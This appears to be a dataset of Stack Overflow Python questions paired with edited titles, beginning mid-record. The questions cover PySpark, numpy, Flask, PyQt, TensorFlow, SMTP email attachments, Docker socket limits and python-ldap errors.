""/usr/hdp/2.5.0.0-1245/spark/python/pyspark/ml/pipeline.py"", line 69, in fit return self._fit(dataset) File ""/usr/hdp/2.5.0.0-1245/spark/python/pyspark/ml/wrapper.py"", line 133, in _fit java_model = self._fit_java(dataset) File ""/usr/hdp/2.5.0.0-1245/spark/python/pyspark/ml/wrapper.py"", line 130, in _fit_java return self._java_obj.fit(dataset._jdf) File ""/usr/hdp/2.5.0.0-1245/spark/python/lib/py4j-0.9-src.zip/py4j/java_gateway.py"", line 813, in call File ""/usr/hdp/2.5.0.0-1245/spark/python/pyspark/sql/utils.py"", line 51, in deco raise AnalysisException(s.split(': ', 1)[1], stackTrace) pyspark.sql.utils.AnalysisException: u""cannot resolve 'features' given input columns: [Channel, Grocery, Fresh, Frozen, Detergents_Paper, Region, Delicassen, Milk];"" <code>  from pyspark import SparkContext, SparkConffrom pyspark.sql import SQLContextimport refrom pyspark.mllib.clustering import KMeans, KMeansModelfrom pyspark.mllib.linalg import DenseVectorfrom pyspark.mllib.linalg import SparseVectorfrom numpy import arrayfrom pyspark.ml.feature import VectorAssemblerfrom pyspark.ml.feature import MinMaxScalerimport pandas as pdimport numpydf = pd.read_csv(""/<path>/Wholesale_customers_data.csv"")sql_sc = SQLContext(sc)cols = [""Channel"", ""Region"", ""Fresh"", ""Milk"", ""Grocery"", ""Frozen"", ""Detergents_Paper"", ""Delicassen""]s_df = sql_sc.createDataFrame(df)vectorAss = VectorAssembler(inputCols=cols, outputCol=""feature"")vdf = vectorAss.transform(s_df)km = KMeans.train(vdf, k=2, maxIterations=10, runs=10, initializationMode=""k-means||"")model = kmeans.fit(vdf)cluster = model.clusterCenters()print(cluster)",How to convert type <class 'pyspark.sql.types.Row'> into Vector
PyCharm - how to run file in IPython console as default instead of terminal?," I started a new project in PyCharm. I have Anaconda 3.6 installed. So, in PyCharm, I selected the Anaconda python.exe as project interpreter.When I first ran PyCharm, it used the IPython console as ""default"" console to run my script. Then I restarted my PC and now PyCharm uses the terminal when I run my scripts. Why? I don't want to use the terminal, coming from Anaconda Spyder IDE. I'm used to IPython, I like it and I want to use it.How can I completely disable the terminal and use only the IPython console? <code> ",How to run a file in IPython console as default instead of terminal?
Error reading matlab file with scipy," I am trying to read a matlab file using scipy but I get the errorValueError: Did not fully consume compressed contents of an miCOMPRESSED element. This can indicate that the .mat file is corrupted.In Matlab I can open this file without any problem. I also tried to save it again, but nothing changed...Can you help me?Here: https://drive.google.com/drive/folders/0B3vXKJ_zYaCJanZfOUVIcGJyR0Eyou can find 2 files saved in the same way..I can open part_000, but not part_001.... why? :( <code>  import scipy.io as siodata = sio.loadmat(filepath)",Unable to read MAT file with scipy
Plotly domain explained (Multiple graphs)," I am looking at the 'Pie Chart Subplots' section (last one on page) of the following tutorial https://plot.ly/python/pie-charts/.I cant figure out how to understand the domain variable when it comes to plotting multiple graphs at once. For instance: will plot a pie chart in the bottom left coordinates.Can someone explain how the domain variable (and its x and y components) works in practice in plotly? <code>  { 'labels': ['1st', '2nd', '3rd', '4th', '5th'], 'values': [38, 27, 18, 10, 7], 'type': 'pie', 'name': 'Starry Night', 'marker': {'colors': ['rgb(56, 75, 126)', 'rgb(18, 36, 37)', 'rgb(34, 53, 101)', 'rgb(36, 55, 57)', 'rgb(6, 4, 4)']}, 'domain': {'x': [0, .48], 'y': [0, .49]}, 'hoverinfo':'label+percent+name', 'textinfo':'none' },",Plotly domain variable explained (Multiple graphs)
how to convert into an array python?," I want to be able to calculate the mean, min and max of A: This does not work, unless converted to: Is it possible to perform this conversion automatically? <code>  import numpy as np A = ['33.33', '33.33', '33.33', '33.37'] NA = np.asarray(A) AVG = np.mean(NA, axis=0) print AVG A = [33.33, 33.33, 33.33, 33.37]",How to convert a list of strings into a numeric numpy array?
Python: Diamond Inheritance-MRO," I'm a newbie for MRO and having problem figuring out the logic for these outputs.Case 1: Output: My question here is how super(C) is calling B.save().As per MRO: super(C, self) is not about the ""base class of C"", but about the next class in the MRO list of C. But there is no B in MRO list of C.Case 2: Output: Case 3: Output: QuestionHow is the MRO affected if B is not inheriting from A, but object directly?Can someone explain the reason behind this? <code>  class A(object): def save(self): print ""A""class B(A): def save(self): print ""B"" super(B, self).save()class C(A): def save(self): print ""C"" super(C, self).save()class D(C, B): def save(self): print ""D"" super(D,self).save()D().save() DCBA class A(object): def save(self): print ""A""class B(A): def save(self): print ""B"" super(B, self).save()class C(A): def save(self): print ""C"" # removed super call hereclass D(C, B): def save(self): print ""D"" super(D,self).save()D().save() DC class A(object): def save(self): print ""A""class B(object): #inherits object now instead of A def save(self): print ""B"" super(B, self).save()class C(A): def save(self): print ""C"" super(C, self).save()class D(C, B): def save(self): print ""D"" super(D,self).save()D().save() DCA",Diamond inheritance and the MRO
Pytest won't convert date field to datetime.date object in Django," I have this simple query written in Django and I want to run my tests with pytest. When I run my tests with Django's test runner: python manage.py test, I get the expected result: But when I do it with pytest -s, I get: Why isn't pytest converting dates like Django's test runner? <code>  results = (self.base_query .order_by('service_date') .extra({'sd': ""date(service_date)""}) .values('sd') .annotate(created_count=Sum('pax_number')))print 'RESULTS: ', results RESULTS: <QuerySet [{'created_count': 14, 'sd': datetime.date(2017, 2, 24)}]> RESULTS: <QuerySet [{'created_count': 14, 'sd': u'2017-02-24'}]>",pytest won't convert date field to datetime.date object in Django
"Menu bar in tkinter python3 is not showing inside application window, but on top. How to fix?"," I was following a tutorial and received different results when doing exactly what was said. I want the menu bar to show up inside the actual tkinter application window like it does on the tutorial. He is using Windows. It is instead showing up on the actual top menu bar of the computer. I am using a Mac if that makes a difference. Is there a way to fix this?This is my code: <code>  from tkinter import *def doNothing(): label1 = Label(root, text=""Doing nothing"") label1.pack()root = Tk()mainmenu = Menu(root)root.config(menu=mainmenu)filemenu = Menu(mainmenu)mainmenu.add_cascade(label=""File"", menu=filemenu)filemenu.add_command(label=""New Project"", command=doNothing)filemenu.add_command(label=""New"", command=doNothing)filemenu.add_separator()filemenu.add_command(label=""Exit"", command=doNothing)editmenu=Menu(mainmenu)mainmenu.add_cascade(label=""Edit"", menu=editmenu)editmenu.add_command(label=""Redo"", command=doNothing)root.mainloop()",Is there a way to show the menu bar inside an application window on a Mac?
How does python increment list elements?," Can someone explain to me why the first code block doesn't change the list, but the second does. This leaves a as [1,2,3]. That said if I run then a = [6,7,8]. My guess is that in the first, when looping over the elements el is a temporary variable, and not actually the thing that references that element in the list. Not sure why incrementing it doesn't effect the list though. <code>  a = [1,2,3]for el in a: el += 5 a = [1,2,3]for i in range(len(a)): a[i] += 5",How does Python increment list elements?
convert a flask factory using flask_script to click," I define my Flask application using the app factory pattern. When using Flask-Script, I can pass the factory function to the Manager. I'd like to use Flask's built-in Click CLI instead. How do I use the factory with Click?My current code uses Flask-Script. How do I do this with Click? <code>  from flask import Flaskfrom flask_script import Manager, Shelldef create_app(): app = Flask(__name__) ... return appmanager = Manager(create_app)def make_shell_context(): return dict(app=app, db=db, User=User, Role=Role)manager.add_command('shell', Shell(make_context=make_shell_context))if __name__ == '__main__': manager.run()",Use Flask's Click CLI with the app factory pattern
"Is it faster to allocate to a position in an indexed dataframe, or concanate to it and index later?"," I want to create a multi-index DataFrame by reading a textfile. Is it faster to create the multi-index and then allocate data to it from the text file using df.loc[[],[]], or concatenate rows to the DataFrame and set the index of the DataFrame at the end? Or, is it faster to use a list or dict to store the data as it's read from the file, and then create a DataFrame from them? Is there a more pythonic or faster option?Example text file: Output DataFrame: Update Jan 18: This is linked to How to parse complex text files using Python? I also wrote a blog article explaining how to parse complex files to beginners. <code>  A = 1 B = 1 C data 0 1 1 2A = 1 B = 2 C data 1 3 2 4A = 2 B = 1 C data 0 5 2 6 A B C data1 1 0 1 1 21 2 1 3 2 42 1 0 5 2 6",What's the fastest way of reading data from a text file and allocating it to a data frame?
Python how to get parent folder name of current directory?, I know there are functions for finding parent directory or path such as. 'C:\Users\jahon\Desktop\Projects\CAA\Result\caa\project_folder'Is there a function that just returns the parent folder name? In this case it should be project_folder. <code>  os.path.dirname(os.path.realpath(__file__)),How to get parent folder name of current directory?
Python Least Squares," I have a optimization problem that I need to solve in python. The general structure is I would like to use least_squares minimization and return the values for f, g, h, i and j as a list where the square difference is the minimum between foo and bar. I'm not sure how to use least_squares for this. I've tried this: How do I get x to be the returned value of the list of f, g, h, i and j minimum values?  <code>  def foo(a, b, c, d, e): # do something and return one valuedef bar(a, b, c, d, e, f, g, h, i, j): # do something and return one valuedef func(): return foo(a, b, c, d, e) - bar(a, b, c, d, e, f, g, h, i, j) # Initial values f, g, h, i, jx0 =[0.5,0.5,0.5,0.05,0.5]# Constraintslb = [0,0,0,0,-0.9]ub = [1, 100, 1, 0.5, 0.9]x = least_squares(func, x0, lb, ub)",Python Least Squares for multiple variables
How to delete nan from a list of strings in Python?," I have a list of strings and want to remove the nan.I tried: But that only works if it contains numbers. How do we solve this for strings in Python 3+? <code>  x = ['A', 'B', nan, 'D'] x = x[~numpy.isnan(x)]",How to delete numpy nan from a list of strings in Python?
How to send email attachment with boto3?," How can I send an image attachment using boto3 SES send_email client? I know that I can use send_raw_email to send an attachment but I need to send the message body with html data. If this is not possible, how can I send an email with html data using boto3.ses.send_raw_email() ? <code> ",How to send HTML text and attachment using boto3 send_email or send_raw_email?
Instagram Scraping with Selenium Python," I am trying to web scrape both Instagram and Twitter based on geolocation.I can run a query search but I am having challenges in reloading the web page to to more and store the fields to data-frame. I did find couple of examples for web scraping twitter and Instagram without API keys. But they are with respect to #tags keywords. I am trying to scrape with respect to geo location and between old dates. so far I have come this far with writing code in python 3.X and all the latest versions of packages in anaconda. For Twitter Search Query I am getting syntax error For Instagram I am not getting any error but I am not able to reload for more posts and write back to csv dataframe. I am also trying to search with latitude and longitude search in both Twitter and Instagram.I have a list of geo coordinates in csv I can use that input or can write a query for search. Any way to complete the scraping with location will be appreciated. Appreciate the help !! <code>  ''' Instagram - Components ""id"": ""1478232643287060472"", ""dimensions"": {""height"": 1080, ""width"": 1080}, ""owner"": {""id"": ""351633262""}, ""thumbnail_src"": ""https://instagram.fdel1-1.fna.fbcdn.net/t51.2885-15/s640x640/sh0.08/e35/17439262_973184322815940_668652714938335232_n.jpg"", ""is_video"": false, ""code"": ""BSDvMHOgw_4"", ""date"": 1490439084, ""taken-at=213385402"" ""display_src"": ""https://instagram.fdel1-1.fna.fbcdn.net/t51.2885-15/e35/17439262_973184322815940_668652714938335232_n.jpg"", ""caption"": ""Hakuna jambo zuri kama kumpa Mungu shukrani kwa kila jambo.. \ud83d\ude4f\ud83c\udffe\nIts weekend\n#lifeistooshorttobeunhappy\n#Godisgood \n#happysoul \ud83d\ude00"", ""comments"": {""count"": 42}, ""likes"": {""count"": 3813}}, '''import seleniumfrom selenium import webdriver#from selenium import seleniumfrom bs4 import BeautifulSoupimport pandas#geotags = pd.read_csv(""geocodes.csv"")#parmalink = query = geocode%3A35.68501%2C139.7514%2C30km%20since:2016-03-01%20until:2016-03-02&f=tweetstwitterURL = 'https://twitter.com/search?q=' + query#instaURL = ""https://www.instagram.com/explore/locations/213385402/""browser = webdriver.Firefox()browser.get(twitterURL)content = browser.page_sourcesoup = BeautifulSoup(content)print (soup)",Web Scraping with Selenium Python [Twitter + Instagram]
"Why does everyone say ""Dont use .place()""?"," I have been working on a note taking program for myself and it is going well however I have had a lot of problems with getting all my widgets placed where I want them using the .pack() or .grid() options. After looking around I found that I could use the .place() option instead. Before I decided to use .place() I found countless forum post saying ""don't use .place()!"". I was at a stand still with my other options so I decided to give .place() a try. It turns out .place() is exactly what I needed to fix my layout issues and I just don't understand why everyone is hating on .place() so much.Is there something inherently wrong with .place()? Or do people just prefer to use .pack() and .grid() for some practical reason other than ease of use? <code> ","Why do people say ""Don't use place()""?"
"Why does people say ""Dont use .place()""?"," I have been working on a note taking program for myself and it is going well however I have had a lot of problems with getting all my widgets placed where I want them using the .pack() or .grid() options. After looking around I found that I could use the .place() option instead. Before I decided to use .place() I found countless forum post saying ""don't use .place()!"". I was at a stand still with my other options so I decided to give .place() a try. It turns out .place() is exactly what I needed to fix my layout issues and I just don't understand why everyone is hating on .place() so much.Is there something inherently wrong with .place()? Or do people just prefer to use .pack() and .grid() for some practical reason other than ease of use? <code> ","Why do people say ""Don't use place()""?"
"Why do people say ""Dont use .place()""?"," I have been working on a note taking program for myself and it is going well however I have had a lot of problems with getting all my widgets placed where I want them using the .pack() or .grid() options. After looking around I found that I could use the .place() option instead. Before I decided to use .place() I found countless forum post saying ""don't use .place()!"". I was at a stand still with my other options so I decided to give .place() a try. It turns out .place() is exactly what I needed to fix my layout issues and I just don't understand why everyone is hating on .place() so much.Is there something inherently wrong with .place()? Or do people just prefer to use .pack() and .grid() for some practical reason other than ease of use? <code> ","Why do people say ""Don't use place()""?"
LSTM: Many to many sequence prediction with different sequence length," My problem is to predict a sequence of values (t_0, t_1, ... t_{n_post-1}) given the previous timesteps (t_{-n_pre}, t_{-n_pre+1} ... t_{-1}) with Keras' LSTM layer.Keras supports the the following two cases well:n_post == 1 (many to one forecast) n_post == n_pre (many to manyforecast with equal sequence lengths)But not the version where n_post < n_pre.To illustrate what I need, I built a simple toy example using a sine wave.Many to one model forecastWith the following model: predictions look like this:Many to many model forecast with n_pre == n_postThe network learns to fit a sine wave with n_pre == n_post pretty well with a model like this: Many to many model forecast with n_post < n_preBut now, assume my data looks like this:dataX or input: (nb_samples, nb_timesteps, nb_features) -> (1000, 50, 1)dataY or output: (nb_samples, nb_timesteps, nb_features) -> (1000, 10, 1)After some research I found a way on how to handle these input sizes in Keras, using a model like this: But the predictions are really bad:Now my questions are:How can I build a model with n_post < n_pre that doesn't lose information because it has a return_sequences=False?Using n_post == n_pre and then cropping the output (after training) doesn't work for me because it would still try to fit on a lot of timesteps while only the first few can be predicted with a neural network (the others are not nicely correlated and would distort the result) <code>  model = Sequential() model.add(LSTM(input_dim=1, output_dim=hidden_neurons, return_sequences=False)) model.add(Dense(1))model.add(Activation('linear')) model.compile(loss='mean_squared_error', optimizer='rmsprop') model = Sequential() model.add(LSTM(input_dim=1, output_dim=hidden_neurons, return_sequences=True)) model.add(TimeDistributed(Dense(1)))model.add(Activation('linear')) model.compile(loss='mean_squared_error', optimizer='rmsprop') model = Sequential() model.add(LSTM(input_dim=1, output_dim=hidden_neurons, return_sequences=False)) model.add(RepeatVector(10))model.add(TimeDistributed(Dense(1)))model.add(Activation('linear')) model.compile(loss='mean_squared_error', optimizer='rmsprop') ",Many to many sequence prediction with different sequence length
Formatted string in Python 3.6," I'm using the .format() a lot in my Python 3.5 projects, but I'm afraid that it will be deprecated during the next Python versions because of f-strings, the new kind of string literal. Does the formatted string feature come to fully replace the old .format()? And from now on, would it be better to use the new style in all cases?I understand that it's based on the idea that ""Simple is better than complex."" However, what about performance issues; is there any difference between them? Or is it just a simple look of the same feature? <code>  >>> name = ""Test"">>> f""My app name is {name}.""'My app name is Test.'",f-strings vs str.format()
Formatted strings in Python 3.6," I'm using the .format() a lot in my Python 3.5 projects, but I'm afraid that it will be deprecated during the next Python versions because of f-strings, the new kind of string literal. Does the formatted string feature come to fully replace the old .format()? And from now on, would it be better to use the new style in all cases?I understand that it's based on the idea that ""Simple is better than complex."" However, what about performance issues; is there any difference between them? Or is it just a simple look of the same feature? <code>  >>> name = ""Test"">>> f""My app name is {name}.""'My app name is Test.'",f-strings vs str.format()
f-strings in Python 3.6," I'm using the .format() a lot in my Python 3.5 projects, but I'm afraid that it will be deprecated during the next Python versions because of f-strings, the new kind of string literal. Does the formatted string feature come to fully replace the old .format()? And from now on, would it be better to use the new style in all cases?I understand that it's based on the idea that ""Simple is better than complex."" However, what about performance issues; is there any difference between them? Or is it just a simple look of the same feature? <code>  >>> name = ""Test"">>> f""My app name is {name}.""'My app name is Test.'",f-strings vs str.format()
PyQt - Detect QMainWindow resizing (window resized signal)," I create a simple UI with Qt Designer and convert it to Python codes. I searched for any method to detect changing window size.This is the generated code : I found a similar question QWidget resize signal? and this tutorial to handle size that recommended overriding resizeEvent method of QMainWindow.But any of them doesn't solve my problem. Is there any resized function to detect window resizing like below: <code>  from PyQt5 import QtCore, QtGui, QtWidgetsclass Ui_MainWindow(object): def onResize(event): print(event) def setupUi(self, MainWindow): MainWindow.setObjectName(""MainWindow"") MainWindow.setWindowTitle(""MainWindow"") MainWindow.resize(200, 200) self.centralwidget = QtWidgets.QWidget(MainWindow) self.centralwidget.setObjectName(""centralwidget"") MainWindow.setCentralWidget(self.centralwidget) MainWindow.resized.connect(self.someFunction) QtCore.QMetaObject.connectSlotsByName(MainWindow)if __name__ == ""__main__"": import sys app = QtWidgets.QApplication(sys.argv) MainWindow = QtWidgets.QMainWindow() ui = Ui_MainWindow() ui.setupUi(MainWindow) MainWindow.show() sys.exit(app.exec_()) MainWindow.resized.connect(self.someFunction)",Detect resizing in Widget-window resized signal
PyQt: Detect resizing in Widget-window resized signal," I create a simple UI with Qt Designer and convert it to Python codes. I searched for any method to detect changing window size.This is the generated code : I found a similar question QWidget resize signal? and this tutorial to handle size that recommended overriding resizeEvent method of QMainWindow.But any of them doesn't solve my problem. Is there any resized function to detect window resizing like below: <code>  from PyQt5 import QtCore, QtGui, QtWidgetsclass Ui_MainWindow(object): def onResize(event): print(event) def setupUi(self, MainWindow): MainWindow.setObjectName(""MainWindow"") MainWindow.setWindowTitle(""MainWindow"") MainWindow.resize(200, 200) self.centralwidget = QtWidgets.QWidget(MainWindow) self.centralwidget.setObjectName(""centralwidget"") MainWindow.setCentralWidget(self.centralwidget) MainWindow.resized.connect(self.someFunction) QtCore.QMetaObject.connectSlotsByName(MainWindow)if __name__ == ""__main__"": import sys app = QtWidgets.QApplication(sys.argv) MainWindow = QtWidgets.QMainWindow() ui = Ui_MainWindow() ui.setupUi(MainWindow) MainWindow.show() sys.exit(app.exec_()) MainWindow.resized.connect(self.someFunction)",Detect resizing in Widget-window resized signal
First time running Tensorflow error part 2," I am running TensorFlow for the first time using some example code. I got the following warnings when running my code. Does anybody know why this happened, and how to fix it? <code>  2017-03-31 02:12:59.346109: W c:\tf_jenkins\home\workspace\release-win\device\cpu\os\windows\tensorflow\core\platform\cpu_feature_guard.cc:45] The TensorFlow library wasn't compiled to use SSE instructions, but these are available on your machine and could speed up CPU computations.2017-03-31 02:12:59.346968: W c:\tf_jenkins\home\workspace\release-win\device\cpu\os\windows\tensorflow\core\platform\cpu_feature_guard.cc:45] The TensorFlow library wasn't compiled to use SSE2 instructions, but these are available on your machine and could speed up CPU computations.2017-03-31 02:12:59.346975: W c:\tf_jenkins\home\workspace\release-win\device\cpu\os\windows\tensorflow\core\platform\cpu_feature_guard.cc:45] The TensorFlow libbrary wasn't compiled to use SSE3 instructions, but these are available on your machine and could speed up CPU computations.2017-03-31 02:12:59.346979: W c:\tf_jenkins\home\workspace\release-win\device\cpu\os\windows\tensorflow\core\platform\cpu_feature_guard.cc:45] The TensorFlow library wasn't compiled to use SSE4.1 instructions, but these are available on your machine and could speed up CPU computations.2017-03-31 02:12:59.346983: W c:\tf_jenkins\home\workspace\release-win\device\cpu\os\windows\tensorflow\core\platform\cpu_feature_guard.cc:45] The TensorFlow library wasn't compiled to use SSE4.2 instructions, but these are available on your machine and could speed up CPU computations.2017-03-31 02:12:59.346987: W c:\tf_jenkins\home\workspace\release-win\device\cpu\os\windows\tensorflow\core\platform\cpu_feature_guard.cc:45] The TensorFlow library wasn't compiled to use AVX instructions, but these are available on your machine and could speed up CPU computations.2017-03-31 02:12:59.346991: W c:\tf_jenkins\home\workspace\release-win\device\cpu\os\windows\tensorflow\core\platform\cpu_feature_guard.cc:45] The TensorFlow library wasn't compiled to use AVX2 instructions, but these are available on your machine and could speed up CPU computations.2017-03-31 02:12:59.346995: W c:\tf_jenkins\home\workspace\release-win\device\cpu\os\windows\tensorflow\core\platform\cpu_feature_guard.cc:45] The TensorFlow library wasn't compiled to use FMA instructions, but these are available on your machine and could speed up CPU computations.","TensorFlow wasn't compiled to use SSE (etc.) instructions, but these are available"
"dask reading csv, setting partition as csv length"," I'm trying to write code that will read from a set of CSVs named my_file_*.csv into a Dask dataframe. Then I want to set the partitions based on the length of the CSV. I'm trying to map a function on each partition and in order to do that, each partition must be the whole CSV.I've tried to reset the index, and then set partitions based on the length of each CSV but it looks like the index of the Dask dataframe is not unique. Is there a better way to partition based on the length of each CSV? <code> ","Dask reading CSV, setting partition as CSV length"
"Dask reading csv, setting partition as csv length"," I'm trying to write code that will read from a set of CSVs named my_file_*.csv into a Dask dataframe. Then I want to set the partitions based on the length of the CSV. I'm trying to map a function on each partition and in order to do that, each partition must be the whole CSV.I've tried to reset the index, and then set partitions based on the length of each CSV but it looks like the index of the Dask dataframe is not unique. Is there a better way to partition based on the length of each CSV? <code> ","Dask reading CSV, setting partition as CSV length"
Python: Index of multiple minimum elements in a list," I want a list to give I know how to do it for when there is only a single min element, but not multiple min elements.example: This will give me b = 0.  <code>  a = [2,4,5,2] b = [0, 3] b = a.index(min(a))",Index of multiple minimum elements in a list
Python: How to attach CSV file with SMTP and email?," Im attempting to attach a CSV file and email it.Currently, I am doing the following but it simply attaches an empty CSV file, rather than attaching the CSV file I have in the same directory: So my question is, what could I be doing wrong? How can I attach the CSV file in the same directory and email, rather than creating an empty CSV file and naming it the same, and emailing? <code>  import smtplibfrom email.mime.multipart import MIMEMultipartfrom email.mime.base import MIMEBasefrom email.mime.text import MIMETextfrom email.utils import COMMASPACEfrom email import encodersdef email_attachment(): SUBJECT = 'Subject string' msg = MIMEMultipart() msg['From'] = 'my_email@yahoo.com' msg['To'] = COMMASPACE.join(['recepient_email@gmail.com']) msg['Subject'] = SUBJECT part = MIMEBase('application', ""octet-stream"") # I have a CSV file named `attachthisfile.csv` in the same directory that I'd like to attach and email part.set_payload(open(""./attachthisfile.csv"", ""rb"").read()) encoders.encode_base64(part) part.add_header('Content-Disposition', 'attachment', filename='attachthisfile.csv') msg.attach(part) smtpObj = smtplib.SMTP('smtp.mail.yahoo.com', 587) smtpObj.ehlo() smtpObj.starttls() smtpObj.login('my_email@yahoo.com', 'myemailpassword') smtpObj.sendmail('my_email@yahoo.com', 'recepient_email@gmail.com', msg.as_string()) smtpObj.quit()",How to email within the program?
Python: How to attach CSV file with MIME/SMTP and email?," Im attempting to attach a CSV file and email it.Currently, I am doing the following but it simply attaches an empty CSV file, rather than attaching the CSV file I have in the same directory: So my question is, what could I be doing wrong? How can I attach the CSV file in the same directory and email, rather than creating an empty CSV file and naming it the same, and emailing? <code>  import smtplibfrom email.mime.multipart import MIMEMultipartfrom email.mime.base import MIMEBasefrom email.mime.text import MIMETextfrom email.utils import COMMASPACEfrom email import encodersdef email_attachment(): SUBJECT = 'Subject string' msg = MIMEMultipart() msg['From'] = 'my_email@yahoo.com' msg['To'] = COMMASPACE.join(['recepient_email@gmail.com']) msg['Subject'] = SUBJECT part = MIMEBase('application', ""octet-stream"") # I have a CSV file named `attachthisfile.csv` in the same directory that I'd like to attach and email part.set_payload(open(""./attachthisfile.csv"", ""rb"").read()) encoders.encode_base64(part) part.add_header('Content-Disposition', 'attachment', filename='attachthisfile.csv') msg.attach(part) smtpObj = smtplib.SMTP('smtp.mail.yahoo.com', 587) smtpObj.ehlo() smtpObj.starttls() smtpObj.login('my_email@yahoo.com', 'myemailpassword') smtpObj.sendmail('my_email@yahoo.com', 'recepient_email@gmail.com', msg.as_string()) smtpObj.quit()",How to email within the program?
How to attach CSV file with MIME/SMTP and email?," Im attempting to attach a CSV file and email it.Currently, I am doing the following but it simply attaches an empty CSV file, rather than attaching the CSV file I have in the same directory: So my question is, what could I be doing wrong? How can I attach the CSV file in the same directory and email, rather than creating an empty CSV file and naming it the same, and emailing? <code>  import smtplibfrom email.mime.multipart import MIMEMultipartfrom email.mime.base import MIMEBasefrom email.mime.text import MIMETextfrom email.utils import COMMASPACEfrom email import encodersdef email_attachment(): SUBJECT = 'Subject string' msg = MIMEMultipart() msg['From'] = 'my_email@yahoo.com' msg['To'] = COMMASPACE.join(['recepient_email@gmail.com']) msg['Subject'] = SUBJECT part = MIMEBase('application', ""octet-stream"") # I have a CSV file named `attachthisfile.csv` in the same directory that I'd like to attach and email part.set_payload(open(""./attachthisfile.csv"", ""rb"").read()) encoders.encode_base64(part) part.add_header('Content-Disposition', 'attachment', filename='attachthisfile.csv') msg.attach(part) smtpObj = smtplib.SMTP('smtp.mail.yahoo.com', 587) smtpObj.ehlo() smtpObj.starttls() smtpObj.login('my_email@yahoo.com', 'myemailpassword') smtpObj.sendmail('my_email@yahoo.com', 'recepient_email@gmail.com', msg.as_string()) smtpObj.quit()",How to email within the program?
modify somaxconn of docker container," How can I increase the listen queue size beyond 128 on a docker image with a read only file system?When I run my container I get the following error:uWSGI: - Listen queue size is greater than the system max net.core.somaxconn (128).I have a Dockerfile with base image python:2.7. I am trying to increase system level limit on Unix socket and TCP connection listen queue so that uwsgi can set a listen queue limit of 1024, as described at uwsgi: your server socket listen backlog is limited to 100 connections.I tried adding these RUN commands to the Dockerfile:echo 4096 > /proc/sys/net/core/somaxconnsysctl -w net.core.somaxconn=4096But these both fail with the following errors respectively:/bin/sh: 1: cannot create /proc/sys/net/core/somaxconn: Read-only file systemsysctl: setting key ""net.core.somaxconn"": Read-only file systemI also tried mounting a file to overwrite the /proc/sys/net/core/somaxconn and that failed with the error cannot be mounted because it is located inside ""/proc""I also tried running sudo sysctl -w net.core.somaxconn=4096net.core.somaxconn = 4096 on the host before running, but it isn't reflected in the docker container; uwsgi still fails with the error uWSGI: - Listen queue size is greater than the system max net.core.somaxconn (128) and running cat /proc/sys/net/core/somaxconn shows 128 in the container while showing 4096 on the host. <code> ",docker container increase listen queue size beyond 128
How to measure server response time for Python requests POST-request?," I create requests POST-requests like this, where I specify timeout threshold:response = requests.post(url, data=post_fields, timeout=timeout)However, to determine a ""good"" threshold value, I would like to benchmark the server response time in advance.How do I compute the minimum and maximum response times for the server? <code> ",How to measure server response time for Python requests POST-request
"What is tensorflow ""op"" does?"," In above I have created a tf placeholder named ""op testing"". And when I print that self.center_words.opit prints out kind of a structure like this This works for any tensorflow variable ,function output etc. What is this .op? <code>  self.center_words = tf.placeholder(tf.int32, shape=[self.batch_size], name='op testing')print(""Extracting the op"",self.center_words.op) op: ""Placeholder""attr { key: ""dtype"" value { type: DT_INT32 }}attr { key: ""shape"" value { shape { dim { size: 128 } } }}","What does tensorflow ""op"" do?"
Python ldap OSX - ValueError: option error," I'm trying to setup python-ldap on macOS Sierra.When I try use the module (which works in my live env running on CentOS)I get the below error, which upon searching looks to be something to do with the install of OpenLDAP or python-ldap on macOS, but I'm yet to find an article that explains how to fix it.Thus far I have installed OpenLDAP via homebrew which has not fixed the issue:error: I have installed openldap via brew as per the below and i have installed python-ldap with pip <code>  Traceback (most recent call last): File ""/usr/local/lib/python2.7/site-packages/django/core/handlers/exception.py"", line 42, in inner response = get_response(request) File ""/usr/local/lib/python2.7/site-packages/django/core/handlers/base.py"", line 249, in _legacy_get_response response = self._get_response(request) File ""/usr/local/lib/python2.7/site-packages/django/core/handlers/base.py"", line 187, in _get_response response = self.process_exception_by_middleware(e, request) File ""/usr/local/lib/python2.7/site-packages/django/core/handlers/base.py"", line 185, in _get_response response = wrapped_callback(request, *callback_args, **callback_kwargs) File ""/usr/local/lib/python2.7/site-packages/django/contrib/auth/views.py"", line 47, in inner return func(*args, **kwargs) File ""/usr/local/lib/python2.7/site-packages/django/views/decorators/debug.py"", line 76, in sensitive_post_parameters_wrapper return view(request, *args, **kwargs) File ""/usr/local/lib/python2.7/site-packages/django/utils/decorators.py"", line 149, in _wrapped_view response = view_func(request, *args, **kwargs) File ""/usr/local/lib/python2.7/site-packages/django/views/decorators/cache.py"", line 57, in _wrapped_view_func response = view_func(request, *args, **kwargs) File ""/usr/local/lib/python2.7/site-packages/django/contrib/auth/views.py"", line 81, in login if form.is_valid(): File ""/usr/local/lib/python2.7/site-packages/django/forms/forms.py"", line 169, in is_valid return self.is_bound and not self.errors File ""/usr/local/lib/python2.7/site-packages/django/forms/forms.py"", line 161, in errors self.full_clean() File ""/usr/local/lib/python2.7/site-packages/django/forms/forms.py"", line 371, in full_clean self._clean_form() File ""/usr/local/lib/python2.7/site-packages/django/forms/forms.py"", line 398, in _clean_form cleaned_data = self.clean() File ""/usr/local/lib/python2.7/site-packages/django/contrib/auth/forms.py"", line 191, in clean self.user_cache = authenticate(username=username, password=password) File ""/usr/local/lib/python2.7/site-packages/django/contrib/auth/__init__.py"", line 74, in authenticate user = backend.authenticate(**credentials) File ""/itapp/itapp/backend.py"", line 39, in authenticate ldap.set_option(ldap.OPT_X_TLS_CACERTFILE,settings.AD_CERT_FILE) File ""/usr/local/lib/python2.7/site-packages/ldap/functions.py"", line 135, in set_option return _ldap_function_call(None,_ldap.set_option,option,invalue) File ""/usr/local/lib/python2.7/site-packages/ldap/functions.py"", line 66, in _ldap_function_call result = func(*args,**kwargs)ValueError: option error alexs-mbp:~ alex$ brew install openldapWarning: openldap is a keg-only and another version is linked to opt.Use `brew install --force` if you want to install this versionalexs-mbp:~ alex$ brew install openldap --forceWarning: openldap-2.4.44 already installed, it's just not linked. alexs-mbp:~ alex$ sudo pip install python-ldapThe directory '/Users/alex/Library/Caches/pip/http' or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.The directory '/Users/alex/Library/Caches/pip' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo's -H flag.Requirement already satisfied: python-ldap in /usr/local/lib/python2.7/site-packagesRequirement already satisfied: setuptools in /usr/local/lib/python2.7/site-packages (from python-ldap",Python ldap macOS - ValueError: option error
